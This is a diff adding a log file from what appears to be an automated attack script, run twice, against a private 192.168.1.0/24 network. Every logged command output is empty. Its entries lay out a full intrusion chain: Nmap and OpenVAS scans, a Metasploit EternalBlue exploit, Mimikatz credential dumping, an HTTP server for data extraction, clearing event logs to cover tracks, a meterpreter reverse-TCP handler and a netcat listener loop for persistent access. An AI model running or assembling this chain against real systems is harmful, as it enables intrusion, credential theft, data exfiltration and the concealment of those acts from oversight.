@@ -1,0 +1,92 @@
+2024-08-12 06:39:12,801 - Generating detailed report of all actions...
+2024-08-12 06:39:12,801 - Starting network scan with Nmap...
+2024-08-12 06:39:12,801 - Running command: nmap -sP 192.168.1.0/24
+2024-08-12 06:39:12,805 - Command output: 
+2024-08-12 06:39:12,805 - Network scan complete.
+2024-08-12 06:39:12,805 - Starting vulnerability assessment with OpenVAS...
+2024-08-12 06:39:12,805 - Running command: openvas --target 192.168.1.0/24
+2024-08-12 06:39:12,808 - Command output: 
+2024-08-12 06:39:12,808 - Vulnerability assessment complete.
+2024-08-12 06:39:12,808 - Attempting to exploit vulnerabilities using Metasploit...
+2024-08-12 06:39:12,808 - Running command: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run'
+2024-08-12 06:39:12,811 - Command output: 
+2024-08-12 06:39:12,811 - Exploitation process complete.
+2024-08-12 06:39:12,811 - Starting privilege escalation using Mimikatz...
+2024-08-12 06:39:12,811 - Running command: mimikatz privilege::debug sekurlsa::logonpasswords exit
+2024-08-12 06:39:12,813 - Command output: 
+2024-08-12 06:39:12,813 - Privilege escalation complete.
+2024-08-12 06:39:12,813 - Beginning data extraction using Python HTTP server...
+2024-08-12 06:39:12,813 - Running command: python3 -m http.server 8080 --bind 192.168.1.10
+2024-08-12 06:39:13,656 - Command output: 
+2024-08-12 06:39:13,656 - Data extraction initiated.
+2024-08-12 06:39:13,656 - Initiating tracks covering...
+2024-08-12 06:39:13,656 - Running command: meterpreter > clearev
+2024-08-12 06:39:13,663 - Command output: 
+2024-08-12 06:39:13,663 - Tracks covering process complete.
+2024-08-12 06:39:13,663 - Report generation complete.
+2024-08-12 06:39:13,663 - Starting advanced network scan with detailed parameters...
+2024-08-12 06:39:13,663 - Running command: nmap -A -p- 192.168.1.0/24
+2024-08-12 06:39:13,668 - Command output: 
+2024-08-12 06:39:13,668 - Advanced network scan complete.
+2024-08-12 06:39:13,668 - Initiating custom exploit development and deployment...
+2024-08-12 06:39:13,668 - Running command: msfconsole -q -x '
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 192.168.1.10
+    set LPORT 4444
+    exploit
+    '
+2024-08-12 06:39:13,673 - Command output: 
+2024-08-12 06:39:13,674 - Custom exploit process complete.
+2024-08-12 06:39:13,674 - Setting up continuous monitoring for persistent access...
+2024-08-12 06:39:13,674 - Running command: 
+    while true; do
+        nc -lvp 4444
+    done
+    
+2024-08-12 06:39:35,839 - Generating detailed report of all actions...
+2024-08-12 06:39:35,839 - Starting network scan with Nmap...
+2024-08-12 06:39:35,839 - Running command: nmap -sP 192.168.1.0/24
+2024-08-12 06:39:35,844 - Command output: 
+2024-08-12 06:39:35,844 - Network scan complete.
+2024-08-12 06:39:35,844 - Starting vulnerability assessment with OpenVAS...
+2024-08-12 06:39:35,844 - Running command: openvas --target 192.168.1.0/24
+2024-08-12 06:39:35,847 - Command output: 
+2024-08-12 06:39:35,847 - Vulnerability assessment complete.
+2024-08-12 06:39:35,847 - Attempting to exploit vulnerabilities using Metasploit...
+2024-08-12 06:39:35,847 - Running command: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run'
+2024-08-12 06:39:35,850 - Command output: 
+2024-08-12 06:39:35,850 - Exploitation process complete.
+2024-08-12 06:39:35,850 - Starting privilege escalation using Mimikatz...
+2024-08-12 06:39:35,850 - Running command: mimikatz privilege::debug sekurlsa::logonpasswords exit
+2024-08-12 06:39:35,853 - Command output: 
+2024-08-12 06:39:35,853 - Privilege escalation complete.
+2024-08-12 06:39:35,853 - Beginning data extraction using Python HTTP server...
+2024-08-12 06:39:35,853 - Running command: python3 -m http.server 8080 --bind 192.168.1.10
+2024-08-12 06:39:35,939 - Command output: 
+2024-08-12 06:39:35,939 - Data extraction initiated.
+2024-08-12 06:39:35,939 - Initiating tracks covering...
+2024-08-12 06:39:35,939 - Running command: meterpreter > clearev
+2024-08-12 06:39:35,943 - Command output: 
+2024-08-12 06:39:35,943 - Tracks covering process complete.
+2024-08-12 06:39:35,943 - Report generation complete.
+2024-08-12 06:39:35,943 - Starting advanced network scan with detailed parameters...
+2024-08-12 06:39:35,943 - Running command: nmap -A -p- 192.168.1.0/24
+2024-08-12 06:39:35,946 - Command output: 
+2024-08-12 06:39:35,946 - Advanced network scan complete.
+2024-08-12 06:39:35,946 - Initiating custom exploit development and deployment...
+2024-08-12 06:39:35,946 - Running command: msfconsole -q -x '
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 192.168.1.10
+    set LPORT 4444
+    exploit
+    '
+2024-08-12 06:39:35,949 - Command output: 
+2024-08-12 06:39:35,949 - Custom exploit process complete.
+2024-08-12 06:39:35,949 - Setting up continuous monitoring for persistent access...
+2024-08-12 06:39:35,949 - Running command: 
+    while true; do
+        nc -lvp 4444
+    done
+    
